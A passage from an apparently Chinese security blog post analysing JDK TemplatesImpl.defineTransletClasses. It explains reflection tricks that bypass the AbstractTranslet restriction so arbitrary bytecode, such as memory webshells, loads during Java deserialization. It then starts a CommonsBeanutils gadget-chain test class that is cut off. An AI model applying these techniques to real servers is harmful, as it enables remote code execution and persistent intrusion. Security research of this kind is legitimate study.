+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>private</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>defineTransletClasses</span><span class=p>()</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>throws</span><span class=w> </span><span class=n>TransformerConfigurationException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>_bytecodes</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ErrorMsg</span><span class=w> </span><span class=n>err</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ErrorMsg</span><span class=p>(</span><span class=n>ErrorMsg</span><span class=p>.</span><span class=na>NO_TRANSLET_CLASS_ERR</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformerConfigurationException</span><span class=p>(</span><span class=n>err</span><span class=p>.</span><span class=na>toString</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nd>@SuppressWarnings</span><span class=p>(</span><span class=s>&#34;removal&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TransletClassLoader</span><span class=w> </span><span class=n>loader</span><span class=w> </span><span class=o>=</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>AccessController</span><span class=p>.</span><span class=na>doPrivileged</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>PrivilegedAction</span><span class=o>&lt;</span><span class=n>TransletClassLoader</span><span class=o>&gt;</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=kd>public</span><span class=w> </span><span class=n>TransletClassLoader</span><span class=w> </span><span class=nf>run</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>return</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransletClassLoader</span><span class=p>(</span><span class=n>ObjectFactory</span><span class=p>.</span><span class=na>findClassLoader</span><span class=p>(),</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                            </span><span class=n>_tfactory</span><span class=p>.</span><span class=na>getExternalExtensionsMap</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>});</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kd>final</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>classCount</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>_bytecodes</span><span class=p>.</span><span class=na>length</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>_class</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>&lt;?&gt;[</span><span class=n>classCount</span><span class=o>]</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>classCount</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>1</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>_auxClasses</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// create a module for the translet</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>String</span><span class=w> </span><span class=n>mn</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;jdk.translet&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>String</span><span class=w> </span><span class=n>pn</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>_tfactory</span><span class=p>.</span><span class=na>getPackageName</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>assert</span><span class=w> </span><span class=n>pn</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>pn</span><span class=p>.</span><span class=na>length</span><span class=p>()</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ModuleDescriptor</span><span class=w> </span><span class=n>descriptor</span><span class=w> </span><span class=o>=</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>ModuleDescriptor</span><span class=p>.</span><span class=na>newModule</span><span class=p>(</span><span class=n>mn</span><span class=p>,</span><span class=w> </span><span class=n>Set</span><span class=p>.</span><span class=na>of</span><span class=p>(</span><span class=n>ModuleDescriptor</span><span class=p>.</span><span class=na>Modifier</span><span class=p>.</span><span class=na>SYNTHETIC</span><span class=p>))</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=p>.</span><span class=na>requires</span><span class=p>(</span><span class=s>&#34;java.xml&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=p>.</span><span class=na>exports</span><span class=p>(</span><span class=n>pn</span><span class=p>,</span><span class=w> </span><span class=n>Set</span><span class=p>.</span><span class=na>of</span><span class=p>(</span><span class=s>&#34;java.xml&#34;</span><span class=p>))</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=p>.</span><span class=na>build</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Module</span><span class=w> </span><span class=n>m</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>createModule</span><span class=p>(</span><span class=n>descriptor</span><span class=p>,</span><span class=w> </span><span class=n>loader</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// the module needs access to runtime classes</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Module</span><span class=w> </span><span class=n>thisModule</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>TemplatesImpl</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getModule</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// the module also needs permission to access each package</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// that is exported to it</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>PermissionCollection</span><span class=w> </span><span class=n>perms</span><span class=w> </span><span class=o>=</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>RuntimePermission</span><span class=p>(</span><span class=s>&#34;*&#34;</span><span class=p>).</span><span class=na>newPermissionCollection</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Arrays</span><span class=p>.</span><span class=na>asList</span><span class=p>(</span><span class=n>Constants</span><span class=p>.</span><span class=na>PKGS_USED_BY_TRANSLET_CLASSES</span><span class=p>).</span><span class=na>forEach</span><span class=p>(</span><span class=n>p</span><span class=w> </span><span class=o>-&gt;</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>thisModule</span><span class=p>.</span><span class=na>addExports</span><span class=p>(</span><span class=n>p</span><span class=p>,</span><span class=w> </span><span class=n>m</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>perms</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>RuntimePermission</span><span class=p>(</span><span class=s>&#34;accessClassInPackage.&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>p</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>});</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>CodeSource</span><span class=w> </span><span class=n>codeSource</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>CodeSource</span><span class=p>(</span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=n>CodeSigner</span><span class=o>[]</span><span class=p>)</span><span class=kc>null</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ProtectionDomain</span><span class=w> </span><span class=n>pd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ProtectionDomain</span><span class=p>(</span><span class=n>codeSource</span><span class=p>,</span><span class=w> </span><span class=n>perms</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                                                       </span><span class=n>loader</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// java.xml needs to instantiate the translet class</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>thisModule</span><span class=p>.</span><span class=na>addReads</span><span class=p>(</span><span class=n>m</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>classCount</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>_class</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>loader</span><span class=p>.</span><span class=na>defineClass</span><span class=p>(</span><span class=n>_bytecodes</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>,</span><span class=w> </span><span class=n>pd</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=kd>final</span><span class=w> </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>superClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>_class</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>.</span><span class=na>getSuperclass</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=c1>// Check if this is the main class</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>superClass</span><span class=p>.</span><span class=na>getName</span><span class=p>().</span><span class=na>equals</span><span class=p>(</span><span class=n>ABSTRACT_TRANSLET</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>_transletIndex</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>i</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>_auxClasses</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>_class</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>.</span><span class=na>getName</span><span class=p>(),</span><span class=w> </span><span class=n>_class</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>_transletIndex</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>ErrorMsg</span><span class=w> </span><span class=n>err</span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ErrorMsg</span><span class=p>(</span><span class=n>ErrorMsg</span><span class=p>.</span><span class=na>NO_MAIN_TRANSLET_ERR</span><span class=p>,</span><span class=w> </span><span class=n>_name</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformerConfigurationException</span><span class=p>(</span><span class=n>err</span><span class=p>.</span><span class=na>toString</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>ClassFormatError</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ErrorMsg</span><span class=w> </span><span class=n>err</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ErrorMsg</span><span class=p>(</span><span class=n>ErrorMsg</span><span class=p>.</span><span class=na>TRANSLET_CLASS_ERR</span><span class=p>,</span><span class=w> </span><span class=n>_name</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformerConfigurationException</span><span class=p>(</span><span class=n>err</span><span class=p>.</span><span class=na>toString</span><span class=p>(),</span><span class=w> </span><span class=n>e</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>LinkageError</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ErrorMsg</span><span class=w> </span><span class=n>err</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ErrorMsg</span><span class=p>(</span><span class=n>ErrorMsg</span><span class=p>.</span><span class=na>TRANSLET_OBJECT_ERR</span><span class=p>,</span><span class=w> </span><span class=n>_name</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformerConfigurationException</span><span class=p>(</span><span class=n>err</span><span class=p>.</span><span class=na>toString</span><span class=p>(),</span><span class=w> </span><span class=n>e</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>字节码不为 null，创建了一个类加载器，<code>_tfactory</code> 不为空，<code>_transletIndex</code>需要大于等于 1。</p><p><code>AbstractTranslet</code> 类通过影响 <code>_transletIndex</code> 的值来限制执行，但 <code>_transletIndex</code> 没有被标记为 <code>transient</code> 是能参与序列化过程的，可以直接通过反射来绕过这个限制。还有一个重要方法，<code>loader.defineClass(_bytecodes[i], pd)</code>: 这是全场最关键的一行代码。它调用类加载器的 <code>defineClass</code> 方法，将 <code>_bytecodes</code> 数组里的二进制流加载到 JVM 方法区中，变成真正的 <code>Class</code> 对象。<code>ABSTRACT_TRANSLET</code>: 常量值为 <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>。Xalan 要求主类必须继承这个父类。<code>_transletIndex</code>: 记录哪个类是主类（因为 <code>_bytecodes</code> 可能包含多个内部类，程序需要知道入口是哪一个）。</p><h3 id=去除-abstracttranslet-限制>去除 AbstractTranslet 限制</h3><p>在加载方法中我们注意到他必须继承自这个类，但是如果我们期望生成 WebSocket 内存马、Value 内存马等也需要继承类的字节码就没办法了，所以接下来要去除该限制。</p><p><code>AbstractTranslet</code> 类通过影响 <code>_transletIndex</code> 的值来限制执行，但 <code>_transletIndex</code> 没有被标记为 <code>transient</code> 是能参与序列化过程的，可以直接通过反射来绕过这个限制。</p><p><img src=/p/high-jdk-reflection-templatesimpl/4.png width=1014 height=182 loading=lazy alt=img></p><p>将中间的模块化省略，代码如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>final</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>classCount</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>_bytecodes</span><span class=p>.</span><span class=na>length</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>_class</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>&lt;?&gt;[</span><span class=n>classCount</span><span class=o>]</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>classCount</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>1</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>_auxClasses</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>classCount</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>_class</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>loader</span><span class=p>.</span><span class=na>defineClass</span><span class=p>(</span><span class=n>_bytecodes</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>,</span><span class=w> </span><span class=n>pd</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>final</span><span class=w> </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>superClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>_class</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>.</span><span class=na>getSuperclass</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// Check if this is the main class</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>superClass</span><span class=p>.</span><span class=na>getName</span><span class=p>().</span><span class=na>equals</span><span class=p>(</span><span class=n>ABSTRACT_TRANSLET</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>_transletIndex</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>i</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>_auxClasses</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>_class</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>.</span><span class=na>getName</span><span class=p>(),</span><span class=w> </span><span class=n>_class</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>当其不继承时，也会向 _auxClasses 中 put 数据，所以需要确保其不为空，而 classCount 如果大于 1 就自动初始化为 HashMap 或者是 Hashtable（看 jdk 版本）。</p><p><img src=/p/high-jdk-reflection-templatesimpl/5.png width=1176 height=200 loading=lazy alt=img></p><p>避免抛出错误，还需要<code>_transletIndex</code>大于等于 0</p><h3 id=_tfactory-问题>_tfactory 问题</h3><p><code>_tfactory</code> 这个字段是被 <code>transient</code> 修饰的，并不参与序列化过程，所以我们是没有必要设置这个值的。</p><p><img src=/p/high-jdk-reflection-templatesimpl/6.png width=1024 height=174 loading=lazy alt=img></p><p>实际来测试下，就用 CB 链来测试下。jdk8u66</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>Base.Unserialize.shiro</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.ClassPool</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.CtClass</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.beanutils.BeanComparator</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ByteArrayInputStream</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ByteArrayOutputStream</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ObjectInputStream</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ObjectOutputStream</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Field</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.PriorityQueue</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.*</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>CB</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClassPool</span><span class=w> </span><span class=n>pool</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>();</span><span class=w>
